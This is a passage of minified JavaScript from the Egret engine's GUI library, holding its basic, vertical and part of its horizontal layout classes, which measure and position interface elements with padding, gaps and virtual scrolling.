				var c = new d.Rectangle;
				c.x = a.x - this._mouseWheelSpeed;
				c.right = a.x;
				return c
			};
			a.prototype.getElementBoundsRightOfScrollRect = function (a) {
				var c = new d.Rectangle;
				c.x = a.right;
				c.right = a.right + this._mouseWheelSpeed;
				return c
			};
			a.prototype.getElementBoundsAboveScrollRect = function (a) {
				var c = new d.Rectangle;
				c.y = a.y - this._mouseWheelSpeed;
				c.bottom = a.y;
				return c
			};
			a.prototype.getElementBoundsBelowScrollRect = function (a) {
				var c = new d.Rectangle;
				c.y = a.bottom;
				c.bottom = a.bottom + this._mouseWheelSpeed;
				return c
			};
			a.prototype.measure = function () {
				c.prototype.measure.call(this);
				if (null !=
					this.target) {
					for (var a = 0, d = 0, e = this.target.numElements, f = 0; f < e; f++) {
						var h = this.target.getElementAt(f);
						if (h && h.includeInLayout) {
							var g = h.horizontalCenter,
							l = h.verticalCenter,
							k = h.left,
							n = h.right,
							q = h.top,
							p = h.bottom;
							isNaN(k) || isNaN(n) ? isNaN(g) ? isNaN(k) && isNaN(n) ? g = h.preferredX : (g = isNaN(k) ? 0 : k, g += isNaN(n) ? 0 : n) : g = 2 * Math.abs(g) : g = k + n;
							isNaN(q) || isNaN(p) ? isNaN(l) ? isNaN(q) && isNaN(p) ? l = h.preferredY : (l = isNaN(q) ? 0 : q, l += isNaN(p) ? 0 : p) : l = 2 * Math.abs(l) : l = q + p;
							p = h.preferredHeight;
							a = Math.ceil(Math.max(a, g + h.preferredWidth));
							d = Math.ceil(Math.max(d, l + p))
						}
					}
					this.target.measuredWidth = a;
					this.target.measuredHeight = d
				}
			};
			a.prototype.updateDisplayList = function (a, d) {
				c.prototype.updateDisplayList.call(this, a, d);
				if (null != this.target) {
					for (var e = this.target.numElements, f = 0, h = 0, g = 0; g < e; g++) {
						var l = this.target.getElementAt(g);
						if (null != l && l.includeInLayout) {
							var k = l.horizontalCenter,
							n = l.verticalCenter,
							q = l.left,
							p = l.right,
							r = l.top,
							x = l.bottom,
							z = l.percentWidth,
							v = l.percentHeight,
							A = NaN,
							t = NaN;
							isNaN(q) || isNaN(p) ? isNaN(z) || (A = Math.round(a * Math.min(0.01 *
											z, 1))) : A = a - p - q;
							isNaN(r) || isNaN(x) ? isNaN(v) || (t = Math.round(d * Math.min(0.01 * v, 1))) : t = d - x - r;
							l.setLayoutBoundsSize(A, t);
							z = l.layoutBoundsWidth;
							v = l.layoutBoundsHeight;
							t = A = NaN;
							A = isNaN(k) ? isNaN(q) ? isNaN(p) ? l.layoutBoundsX : a - z - p : q : Math.round((a - z) / 2 + k);
							t = isNaN(n) ? isNaN(r) ? isNaN(x) ? l.layoutBoundsY : d - v - x : r : Math.round((d - v) / 2 + n);
							l.setLayoutBoundsPosition(A, t);
							f = Math.max(f, A + z);
							h = Math.max(h, t + v)
						}
					}
					this.target.setContentSize(f, h)
				}
			};
			return a
		}
		(e.LayoutBase);
		e.BasicLayout = f;
		f.prototype.__class__ = "egret.gui.BasicLayout"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.LEFT = "left";
			c.JUSTIFY_USING_GAP = "justifyUsingGap";
			c.JUSTIFY_USING_WIDTH = "justifyUsingWidth";
			return c
		}
		();
		d.ColumnAlign = f;
		f.prototype.__class__ = "egret.gui.ColumnAlign"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.TOP = "top";
			c.JUSTIFY_USING_GAP = "justifyUsingGap";
			c.JUSTIFY_USING_HEIGHT = "justifyUsingHeight";
			return c
		}
		();
		d.RowAlign = f;
		f.prototype.__class__ = "egret.gui.RowAlign"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
(function (d) {
	(function (d) {
		var f = function () {
			function c() {}

			c.ROWS = "rows";
			c.COLUMNS = "columns";
			return c
		}
		();
		d.TileOrientation = f;
		f.prototype.__class__ = "egret.gui.TileOrientation"
	})(d.gui || (d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (a) {
			function b() {
				a.call(this);
				this._horizontalAlign = d.HorizontalAlign.LEFT;
				this._verticalAlign = d.VerticalAlign.TOP;
				this._gap = 6;
				this._padding = 0;
				this._paddingBottom = this._paddingTop = this._paddingRight = this._paddingLeft = NaN;
				this.elementSizeTable = [];
				this.endIndex = this.startIndex = -1;
				this.indexInViewCalculated = !1;
				this.maxElementWidth = 0
			}
			__extends(b, a);
			Object.defineProperty(b.prototype, "horizontalAlign", {
				get : function () {
					return this._horizontalAlign
				},
				set : function (a) {
					this._horizontalAlign !=
					a && (this._horizontalAlign = a, this.target && this.target.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "verticalAlign", {
				get : function () {
					return this._verticalAlign
				},
				set : function (a) {
					this._verticalAlign != a && (this._verticalAlign = a, this.target && this.target.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "gap", {
				get : function () {
					return this._gap
				},
				set : function (a) {
					this._gap != a && (this._gap = a, this.invalidateTargetSizeAndDisplayList(),
						this.hasEventListener("gapChanged") && this.dispatchEventWith("gapChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "padding", {
				get : function () {
					return this._padding
				},
				set : function (a) {
					this._padding != a && (this._padding = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "paddingLeft", {
				get : function () {
					return this._paddingLeft
				},
				set : function (a) {
					this._paddingLeft != a && (this._paddingLeft = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "paddingRight", {
				get : function () {
					return this._paddingRight
				},
				set : function (a) {
					this._paddingRight != a && (this._paddingRight = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "paddingTop", {
				get : function () {
					return this._paddingTop
				},
				set : function (a) {
					this._paddingTop != a && (this._paddingTop = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype,
				"paddingBottom", {
				get : function () {
					return this._paddingBottom
				},
				set : function (a) {
					this._paddingBottom != a && (this._paddingBottom = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			b.prototype.invalidateTargetSizeAndDisplayList = function () {
				this.target && (this.target.invalidateSize(), this.target.invalidateDisplayList())
			};
			b.prototype.measure = function () {
				a.prototype.measure.call(this);
				this.target && (this.useVirtualLayout ? this.measureVirtual() : this.measureReal())
			};
			b.prototype.measureVirtual =
			function () {
				for (var a = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22, b = Math.max(this.maxElementWidth, this.typicalLayoutRect ? this.typicalLayoutRect.width : 71), c = this.getElementTotalSize(), d = this.target.getElementIndicesInView(), e = d.length, f = 0; f < e; f++) {
					var k = d[f],
					n = this.target.getElementAt(k);
					if (null != n && n.includeInLayout)
						var q = n.preferredWidth, c = c + n.preferredHeight, c = c - (isNaN(this.elementSizeTable[k]) ? a : this.elementSizeTable[k]), b = Math.max(b, q)
				}
				f = isNaN(this._padding) ? 0 : this._padding;
				a = isNaN(this._paddingLeft) ?
					f : this._paddingLeft;
				d = isNaN(this._paddingRight) ? f : this._paddingRight;
				e = isNaN(this._paddingTop) ? f : this._paddingTop;
				f = isNaN(this._paddingBottom) ? f : this._paddingBottom;
				e += f;
				this.target.measuredWidth = Math.ceil(b + (a + d));
				this.target.measuredHeight = Math.ceil(c + e)
			};
			b.prototype.measureReal = function () {
				for (var a = this.target.numElements, b = a, c = 0, d = 0, e = 0; e < a; e++) {
					var f = this.target.getElementAt(e);
					if (f && f.includeInLayout)
						var k = f.preferredWidth, d = d + f.preferredHeight, c = Math.max(c, k);
					else
						b--
				}
				a = isNaN(this._gap) ? 0 :
					this._gap;
				d += (b - 1) * a;
				f = isNaN(this._padding) ? 0 : this._padding;
				b = isNaN(this._paddingLeft) ? f : this._paddingLeft;
				a = isNaN(this._paddingRight) ? f : this._paddingRight;
				e = isNaN(this._paddingTop) ? f : this._paddingTop;
				f = isNaN(this._paddingBottom) ? f : this._paddingBottom;
				e += f;
				this.target.measuredWidth = Math.ceil(c + (b + a));
				this.target.measuredHeight = Math.ceil(d + e)
			};
			b.prototype.updateDisplayList = function (b, c) {
				a.prototype.updateDisplayList.call(this, b, c);
				this.target && (this.useVirtualLayout ? this.updateDisplayListVirtual(b,
						c) : this.updateDisplayListReal(b, c))
			};
			b.prototype.getStartPosition = function (a) {
				var b = isNaN(this._padding) ? 0 : this._padding,
				c = isNaN(this._paddingTop) ? b : this._paddingTop,
				b = isNaN(this._gap) ? 0 : this._gap;
				if (!this.useVirtualLayout) {
					var d;
					this.target && (d = this.target.getElementAt(a));
					return d ? d.y : c
				}
				d = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22;
				for (var e = 0; e < a; e++) {
					var f = this.elementSizeTable[e];
					isNaN(f) && (f = d);
					c += f + b
				}
				return c
			};
			b.prototype.getElementSize = function (a) {
				return this.useVirtualLayout ?
				(a = this.elementSizeTable[a], isNaN(a) && (a = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22), a) : this.target ? this.target.getElementAt(a).height : 0
			};
			b.prototype.getElementTotalSize = function () {
				for (var a = isNaN(this._gap) ? 0 : this._gap, b = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22, c = 0, d = this.target.numElements, e = 0; e < d; e++) {
					var f = this.elementSizeTable[e];
					isNaN(f) && (f = b);
					c += f + a
				}
				return c - a
			};
			b.prototype.elementAdded = function (b) {
				a.prototype.elementAdded.call(this, b);
				this.elementSizeTable.splice(b,
					0, this.typicalLayoutRect ? this.typicalLayoutRect.height : 22)
			};
			b.prototype.elementRemoved = function (b) {
				a.prototype.elementRemoved.call(this, b);
				this.elementSizeTable.splice(b, 1)
			};
			b.prototype.clearVirtualLayoutCache = function () {
				a.prototype.clearVirtualLayoutCache.call(this);
				this.elementSizeTable = [];
				this.maxElementWidth = 0
			};
			b.prototype.findIndexAt = function (a, b, c) {
				var d = Math.floor(0.5 * (b + c)),
				e = this.getStartPosition(d),
				f = this.getElementSize(d),
				k = isNaN(this._gap) ? 0 : this._gap;
				return a >= e && a < e + f + k ? d : b == c ? -1 : a <
				e ? this.findIndexAt(a, b, Math.max(b, d - 1)) : this.findIndexAt(a, Math.min(d + 1, c), c)
			};
			b.prototype.scrollPositionChanged = function () {
				a.prototype.scrollPositionChanged.call(this);
				this.useVirtualLayout && this.getIndexInView() && (this.indexInViewCalculated = !0, this.target.invalidateDisplayList())
			};
			b.prototype.getIndexInView = function () {
				if (!this.target || 0 == this.target.numElements || isNaN(this.target.width) || 0 == this.target.width || isNaN(this.target.height) || 0 == this.target.height)
					return this.startIndex = this.endIndex =
						-1, !1;
				var a = isNaN(this._padding) ? 0 : this._padding,
				b = isNaN(this._paddingTop) ? a : this._paddingTop,
				c = isNaN(this._paddingBottom) ? a : this._paddingBottom,
				a = this.target.numElements,
				d = this.getStartPosition(a - 1) + this.elementSizeTable[a - 1] + c,
				e = this.target.verticalScrollPosition;
				if (e > d - c)
					return this.endIndex = this.startIndex = -1, !1;
				c = this.target.verticalScrollPosition + this.target.height;
				if (c < b)
					return this.endIndex = this.startIndex = -1, !1;
				b = this.startIndex;
				d = this.endIndex;
				this.startIndex = this.findIndexAt(e, 0, a - 1);
				-1 ==
				this.startIndex && (this.startIndex = 0);
				this.endIndex = this.findIndexAt(c, 0, a - 1);
				-1 == this.endIndex && (this.endIndex = a - 1);
				return b != this.startIndex || d != this.endIndex
			};
			b.prototype.updateDisplayListVirtual = function (a, b) {
				this.indexInViewCalculated ? this.indexInViewCalculated = !1 : this.getIndexInView();
				var c = isNaN(this._padding) ? 0 : this._padding,
				e = isNaN(this._paddingLeft) ? c : this._paddingLeft,
				f = isNaN(this._paddingRight) ? c : this._paddingRight,
				l = isNaN(this._paddingBottom) ? c : this._paddingBottom,
				k = isNaN(this._gap) ? 0 :
					this._gap,
				n = this.target.numElements;
				if (-1 == this.startIndex || -1 == this.endIndex)
					e = this.getStartPosition(n) - k + l, this.target.setContentSize(this.target.contentWidth, Math.ceil(e));
				else {
					this.target.setVirtualElementIndicesInView(this.startIndex, this.endIndex);
					var q = this._horizontalAlign == d.HorizontalAlign.JUSTIFY || this._horizontalAlign == d.HorizontalAlign.CONTENT_JUSTIFY,
					p = this._horizontalAlign == d.HorizontalAlign.CONTENT_JUSTIFY,
					r = 0;
					q || (this._horizontalAlign == d.HorizontalAlign.CENTER ? r = 0.5 : this._horizontalAlign ==
							d.HorizontalAlign.RIGHT && (r = 1));
					var x = Math.max(0, a - e - f),
					z = Math.ceil(x),
					v,
					A = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22,
					c = Math.max(this.typicalLayoutRect ? this.typicalLayoutRect.width : 71, this.maxElementWidth);
					if (p) {
						for (var t = this.startIndex; t <= this.endIndex; t++)
							(v = this.target.getVirtualElementAt(t)) && v.includeInLayout && (this.maxElementWidth = Math.max(this.maxElementWidth, v.preferredWidth));
						z = Math.ceil(Math.max(x, this.maxElementWidth))
					}
					for (var B = 0, w = 0, t = 0, E = !1, D = this.startIndex; D <= this.endIndex; D++)
						if (B =
								0, v = this.target.getVirtualElementAt(D))
							v.includeInLayout ? (q ? (B = e, v.setLayoutBoundsSize(z, NaN)) : (B = (x - v.layoutBoundsWidth) * r, B = 0 < B ? B : 0, B = e + B), p || (this.maxElementWidth = Math.max(this.maxElementWidth, v.preferredWidth)), t = Math.max(t, v.layoutBoundsWidth), E || (w = isNaN(this.elementSizeTable[D]) ? A : this.elementSizeTable[D], w != v.layoutBoundsHeight && (E = !0)), 0 == D && 0 < this.elementSizeTable.length && this.elementSizeTable[D] != v.layoutBoundsHeight && (this.typicalLayoutRect = null), this.elementSizeTable[D] = v.layoutBoundsHeight,
								w = this.getStartPosition(D), v.setLayoutBoundsPosition(Math.round(B), Math.round(w))) : this.elementSizeTable[D] = 0;
					t += e + f;
					e = this.getStartPosition(n) - k + l;
					this.target.setContentSize(Math.ceil(t), Math.ceil(e));
					(E || c < this.maxElementWidth) && this.target.invalidateSize()
				}
			};
			b.prototype.updateDisplayListReal = function (a, e) {
				var f = isNaN(this._padding) ? 0 : this._padding,
				h = isNaN(this._paddingLeft) ? f : this._paddingLeft,
				g = isNaN(this._paddingRight) ? f : this._paddingRight,
				l = isNaN(this._paddingTop) ? f : this._paddingTop,
				f = isNaN(this._paddingBottom) ?
					f : this._paddingBottom,
				k = isNaN(this._gap) ? 0 : this._gap,
				n = Math.max(0, a - h - g),
				q = Math.max(0, e - l - f),
				p = this._verticalAlign == d.VerticalAlign.JUSTIFY,
				r = this._horizontalAlign == d.HorizontalAlign.JUSTIFY || this._horizontalAlign == d.HorizontalAlign.CONTENT_JUSTIFY,
				x = 0;
				r || (this._horizontalAlign == d.HorizontalAlign.CENTER ? x = 0.5 : this._horizontalAlign == d.HorizontalAlign.RIGHT && (x = 1));
				var z = this.target.numElements,
				v = z,
				A = h,
				t = l,
				B,
				w,
				E = 0,
				A = 0,
				D = [],
				C,
				s = q;
				for (B = 0; B < z; B++)
					(w = this.target.getElementAt(B)) && w.includeInLayout ? (this.maxElementWidth =
							Math.max(this.maxElementWidth, w.preferredWidth), p ? E += w.preferredHeight : isNaN(w.percentHeight) ? s -= w.preferredHeight : (A += w.percentHeight, C = new c, C.layoutElement = w, C.percent = w.percentHeight, C.min = w.minHeight, C.max = w.maxHeight, D.push(C))) : v--;
				var s = s - (v - 1) * k,
				s = 0 < s ? s : 0,
				J = q - E - k * (v - 1),
				L,
				G = v,
				I = [];
				if (p) {
					if (0 > J) {
						L = s / v;
						for (B = 0; B < z; B++)
							(w = this.target.getElementAt(B)) && w.includeInLayout && (w = w.preferredHeight, w <= L && (s -= w, G--));
						s = 0 < s ? s : 0
					}
				} else if (0 < A) {
					b.flexChildrenProportionally(q, s, A, D);
					q = 0;
					w = D.length;
					for (B = 0; B <
						w; B++)
						C = D[B], A = Math.round(C.size + q), q += C.size - A, I[C.layoutElement.hashCode] = A, s -= A;
					s = 0 < s ? s : 0
				}
				this._verticalAlign == d.VerticalAlign.MIDDLE ? t = l + 0.5 * s : this._verticalAlign == d.VerticalAlign.BOTTOM && (t = l + s);
				D = h;
				w = v = 0;
				C = Math.ceil(n);
				this._horizontalAlign == d.HorizontalAlign.CONTENT_JUSTIFY && (C = Math.ceil(Math.max(n, this.maxElementWidth)));
				q = 0;
				v = NaN;
				for (B = 0; B < z; B++)
					A = 0, (w = this.target.getElementAt(B)) && w.includeInLayout && (v = NaN, p ? (A = NaN, 0 < J ? A = s * w.preferredHeight / E : 0 > J && w.preferredHeight > L && (A = s / G), isNaN(A) ||
							(v = Math.round(A + q), q += A - v)) : v = I[w.hashCode], r ? (A = h, w.setLayoutBoundsSize(C, v)) : (A = NaN, isNaN(w.percentWidth) || (A = Math.min(100, w.percentWidth), A = Math.round(n * A * 0.01)), w.setLayoutBoundsSize(A, v), A = (n - w.layoutBoundsWidth) * x, A = 0 < A ? A : 0, A = h + A), w.setLayoutBoundsPosition(Math.round(A), Math.round(t)), v = Math.ceil(w.layoutBoundsWidth), w = Math.ceil(w.layoutBoundsHeight), D = Math.max(D, A + v), l = Math.max(l, t + w), t += w + k);
				this.target.setContentSize(Math.ceil(D + g), Math.ceil(l + f))
			};
			b.flexChildrenProportionally = function (a,
				b, c, d) {
				var e = d.length,
				f;
				do {
					f = !0;
					var k = b - a * c / 100;
					0 < k ? b -= k : k = 0;
					for (var n = b / c, q = 0; q < e; q++) {
						var p = d[q],
						r = p.percent * n;
						if (r < p.min) {
							f = p.min;
							p.size = f;
							d[q] = d[--e];
							d[e] = p;
							c -= p.percent;
							k >= f || (b -= f - k);
							f = !1;
							break
						} else if (r > p.max) {
							f = p.max;
							p.size = f;
							d[q] = d[--e];
							d[e] = p;
							c -= p.percent;
							k >= f || (b -= f - k);
							f = !1;
							break
						} else
							p.size = r
					}
				} while (!f)
			};
			return b
		}
		(e.LayoutBase);
		e.VerticalLayout = f;
		f.prototype.__class__ = "egret.gui.VerticalLayout";
		var c = function () {
			return function () {
				this.size = 0
			}
		}
		();
		c.prototype.__class__ = "ChildInfo"
	})(d.gui ||
		(d.gui = {}))
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	(function (e) {
		var f = function (a) {
			function b() {
				a.call(this);
				this._horizontalAlign = d.HorizontalAlign.LEFT;
				this._verticalAlign = d.VerticalAlign.TOP;
				this._gap = 6;
				this._padding = 0;
				this._paddingBottom = this._paddingTop = this._paddingRight = this._paddingLeft = NaN;
				this.elementSizeTable = [];
				this.endIndex = this.startIndex = -1;
				this.indexInViewCalculated = !1;
				this.maxElementHeight = 0
			}
			__extends(b, a);
			Object.defineProperty(b.prototype, "horizontalAlign", {
				get : function () {
					return this._horizontalAlign
				},
				set : function (a) {
					this._horizontalAlign !=
					a && (this._horizontalAlign = a, this.target && this.target.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "verticalAlign", {
				get : function () {
					return this._verticalAlign
				},
				set : function (a) {
					this._verticalAlign != a && (this._verticalAlign = a, this.target && this.target.invalidateDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "gap", {
				get : function () {
					return this._gap
				},
				set : function (a) {
					this._gap != a && (this._gap = a, this.invalidateTargetSizeAndDisplayList(),
						this.hasEventListener("gapChanged") && this.dispatchEventWith("gapChanged"))
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "padding", {
				get : function () {
					return this._padding
				},
				set : function (a) {
					this._padding != a && (this._padding = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "paddingLeft", {
				get : function () {
					return this._paddingLeft
				},
				set : function (a) {
					this._paddingLeft != a && (this._paddingLeft = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "paddingRight", {
				get : function () {
					return this._paddingRight
				},
				set : function (a) {
					this._paddingRight != a && (this._paddingRight = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype, "paddingTop", {
				get : function () {
					return this._paddingTop
				},
				set : function (a) {
					this._paddingTop != a && (this._paddingTop = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			Object.defineProperty(b.prototype,
				"paddingBottom", {
				get : function () {
					return this._paddingBottom
				},
				set : function (a) {
					this._paddingBottom != a && (this._paddingBottom = a, this.invalidateTargetSizeAndDisplayList())
				},
				enumerable : !0,
				configurable : !0
			});
			b.prototype.invalidateTargetSizeAndDisplayList = function () {
				this.target && (this.target.invalidateSize(), this.target.invalidateDisplayList())
			};
			b.prototype.measure = function () {
				a.prototype.measure.call(this);
				this.target && (this.useVirtualLayout ? this.measureVirtual() : this.measureReal())
			};
			b.prototype.measureVirtual =
			function () {
				for (var a = this.typicalLayoutRect ? this.typicalLayoutRect.height : 22, b = this.typicalLayoutRect ? this.typicalLayoutRect.width : 71, c = this.getElementTotalSize(), a = Math.max(this.maxElementHeight, a), d = this.target.getElementIndicesInView(), e = d.length, f = 0; f < e; f++) {
					var k = d[f],
					n = this.target.getElementAt(k);
					if (null != n && n.includeInLayout)
						var q = n.preferredHeight, c = c + n.preferredWidth, c = c - (isNaN(this.elementSizeTable[k]) ? b : this.elementSizeTable[k]), a = Math.max(a, q)
				}
				f = isNaN(this._padding) ? 0 : this._padding;
				b =
					isNaN(this._paddingLeft) ? f : this._paddingLeft;
				d = isNaN(this._paddingRight) ? f : this._paddingRight;
				e = isNaN(this._paddingTop) ? f : this._paddingTop;
				f = isNaN(this._paddingBottom) ? f : this._paddingBottom;
				e += f;
				this.target.measuredWidth = Math.ceil(c + (b + d));
				this.target.measuredHeight = Math.ceil(a + e)
			};
			b.prototype.measureReal = function () {
				for (var a = this.target.numElements, b = a, c = 0, d = 0, e = 0; e < a; e++) {
					var f = this.target.getElementAt(e);
					if (f && f.includeInLayout)
						var k = f.preferredHeight, c = c + f.preferredWidth, d = Math.max(d, k);
					else
						b--
				}
				a =
					isNaN(this._gap) ? 0 : this._gap;
				c += (b - 1) * a;
				f = isNaN(this._padding) ? 0 : this._padding;
				b = isNaN(this._paddingLeft) ? f : this._paddingLeft;
				a = isNaN(this._paddingRight) ? f : this._paddingRight;
				e = isNaN(this._paddingTop) ? f : this._paddingTop;
				f = isNaN(this._paddingBottom) ? f : this._paddingBottom;
				e += f;
				this.target.measuredWidth = Math.ceil(c + (b + a));
				this.target.measuredHeight = Math.ceil(d + e)
			};
			b.prototype.updateDisplayList = function (b, c) {
				a.prototype.updateDisplayList.call(this, b, c);
				this.target && (this.useVirtualLayout ? this.updateDisplayListVirtual(b,
						c) : this.updateDisplayListReal(b, c))
			};
			b.prototype.getStartPosition = function (a) {
				var b = isNaN(this._padding) ? 0 : this._padding,
				c = isNaN(this._paddingLeft) ? b : this._paddingLeft,
				b = isNaN(this._gap) ? 0 : this._gap;
				if (!this.useVirtualLayout) {
					var d;
					this.target && (d = this.target.getElementAt(a));
					return d ? d.x : c
				}
				d = this.typicalLayoutRect ? this.typicalLayoutRect.width : 71;
				for (var e = 0; e < a; e++) {
					var f = this.elementSizeTable[e];
					isNaN(f) && (f = d);
					c += f + b
				}
				return c
			};
			b.prototype.getElementSize = function (a) {
				return this.useVirtualLayout ?
				(a = this.elementSizeTable[a], isNaN(a) && (a = this.typicalLayoutRect ? this.typicalLayoutRect.width : 71), a) : this.target ? this.target.getElementAt(a).width : 0
			};
			b.prototype.getElementTotalSize = function () {
				for (var a = this.typicalLayoutRect ? this.typicalLayoutRect.width : 71, b = isNaN(this._gap) ? 0 : this._gap, c = 0, d = this.target.numElements, e = 0; e < d; e++) {
					var f = this.elementSizeTable[e];
					isNaN(f) && (f = a);
					c += f + b
				}
				return c - b
			};
			b.prototype.elementAdded = function (b) {
				this.useVirtualLayout && (a.prototype.elementAdded.call(this, b), this.elementSizeTable.splice(b,
						0, this.typicalLayoutRect ? this.typicalLayoutRect.width : 71))
			};
			b.prototype.elementRemoved = function (b) {
				this.useVirtualLayout && (a.prototype.elementRemoved.call(this, b), this.elementSizeTable.splice(b, 1))
			};
			b.prototype.clearVirtualLayoutCache = function () {
				this.useVirtualLayout && (a.prototype.clearVirtualLayoutCache.call(this), this.elementSizeTable = [], this.maxElementHeight = 0)
			};
			b.prototype.findIndexAt = function (a, b, c) {
				var d = Math.floor(0.5 * (b + c)),
				e = this.getStartPosition(d),
				f = this.getElementSize(d),
				k = isNaN(this._gap) ?
					0 : this._gap;
				return a >= e && a < e + f + k ? d : b == c ? -1 : a < e ? this.findIndexAt(a, b, Math.max(b, d - 1)) : this.findIndexAt(a, Math.min(d + 1, c), c)
			};
			b.prototype.scrollPositionChanged = function () {
				a.prototype.scrollPositionChanged.call(this);
				this.useVirtualLayout && this.getIndexInView() && (this.indexInViewCalculated = !0, this.target.invalidateDisplayList())
			};
			b.prototype.getIndexInView = function () {
				if (!this.target || 0 == this.target.numElements || isNaN(this.target.width) || 0 == this.target.width || isNaN(this.target.height) || 0 == this.target.height)
					return this.startIndex =
						this.endIndex = -1, !1;
				var a = isNaN(this._padding) ? 0 : this._padding,
				b = isNaN(this._paddingLeft) ? a : this._paddingLeft,
				c = isNaN(this._paddingRight) ? a : this._paddingRight;
				isNaN(this._paddingTop);
				isNaN(this._paddingBottom);
				var a = this.target.numElements,
				d = this.getStartPosition(a - 1) + this.elementSizeTable[a - 1] + c,
				e = this.target.horizontalScrollPosition;
				if (e > d - c)
					return this.endIndex = this.startIndex = -1, !1;
				c = this.target.horizontalScrollPosition + this.target.width;
				if (c < b)
					return this.endIndex = this.startIndex = -1, !1;
				b = this.startIndex;
				d = this.endIndex;
				this.startIndex = this.findIndexAt(e, 0, a - 1);
				-1 == this.startIndex && (this.startIndex = 0);
				this.endIndex = this.findIndexAt(c, 0, a - 1);
				-1 == this.endIndex && (this.endIndex = a - 1);
				return b != this.startIndex || d != this.endIndex
			};
			b.prototype.updateDisplayListVirtual = function (a, b) {
				this.indexInViewCalculated ? this.indexInViewCalculated = !1 : this.getIndexInView();
				var c = isNaN(this._padding) ? 0 : this._padding,
				e = isNaN(this._paddingRight) ? c : this._paddingRight,
				f = isNaN(this._paddingTop) ? c : this._paddingTop,
				l = isNaN(this._paddingBottom) ?
					c : this._paddingBottom,
				k = isNaN(this._gap) ? 0 : this._gap,
				n = this.target.numElements;
				if (-1 == this.startIndex || -1 == this.endIndex)
					e = this.getStartPosition(n) - k + e, this.target.setContentSize(Math.ceil(e), this.target.contentHeight);
				else {
					this.target.setVirtualElementIndicesInView(this.startIndex, this.endIndex);
					var q = this._verticalAlign == d.VerticalAlign.JUSTIFY || this._verticalAlign == d.VerticalAlign.CONTENT_JUSTIFY,
					p = this._verticalAlign == d.VerticalAlign.CONTENT_JUSTIFY,
					r = 0;
					q || (this._verticalAlign == d.VerticalAlign.MIDDLE ?
						r = 0.5 : this._verticalAlign == d.VerticalAlign.BOTTOM && (r = 1));
					var x = Math.max(0, b - f - l),
					z = Math.ceil(x),
					v,
					A = this.typicalLayoutRect ? this.typicalLayoutRect.width : 71,
					c = Math.max(this.typicalLayoutRect ? this.typicalLayoutRect.height : 22, this.maxElementHeight);
					if (p) {
						for (var t = this.startIndex; t <= this.endIndex; t++)
							(v = this.target.getVirtualElementAt(t)) && v.includeInLayout && (this.maxElementHeight = Math.max(this.maxElementHeight, v.preferredHeight));
						z = Math.ceil(Math.max(x, this.maxElementHeight))
					}
					for (var B = 0, w = 0, t = 0, E =
							!1, D = this.startIndex; D <= this.endIndex; D++)
						if (w = 0, v = this.target.getVirtualElementAt(D))
							v.includeInLayout ? (q ? (w = f, v.setLayoutBoundsSize(NaN, z)) : (w = (x - v.layoutBoundsHeight) * r, w = 0 < w ? w : 0, w = f + w), p || (this.maxElementHeight = Math.max(this.maxElementHeight, v.preferredHeight)), t = Math.max(t, v.layoutBoundsHeight), E || (B = isNaN(this.elementSizeTable[D]) ? A : this.elementSizeTable[D], B != v.layoutBoundsWidth && (E = !0)), 0 == D && 0 < this.elementSizeTable.length && this.elementSizeTable[D] != v.layoutBoundsWidth && (this.typicalLayoutRect =
										null), this.elementSizeTable[D] = v.layoutBoundsWidth, B = this.getStartPosition(D), v.setLayoutBoundsPosition(Math.round(B), Math.round(w))) : this.elementSizeTable[D] = 0;
					t += f + l;
					e = this.getStartPosition(n) - k + e;
					this.target.setContentSize(Math.ceil(e), Math.ceil(t));
					(E || c < this.maxElementHeight) && this.target.invalidateSize()
				}
			};
			b.prototype.updateDisplayListReal = function (a, e) {
				var f = isNaN(this._padding) ? 0 : this._padding,
				h = isNaN(this._paddingLeft) ? f : this._paddingLeft,
				g = isNaN(this._paddingRight) ? f : this._paddingRight,
				l = isNaN(this._paddingTop) ? f : this._paddingTop,
				f = isNaN(this._paddingBottom) ? f : this._paddingBottom,
				k = isNaN(this._gap) ? 0 : this._gap,
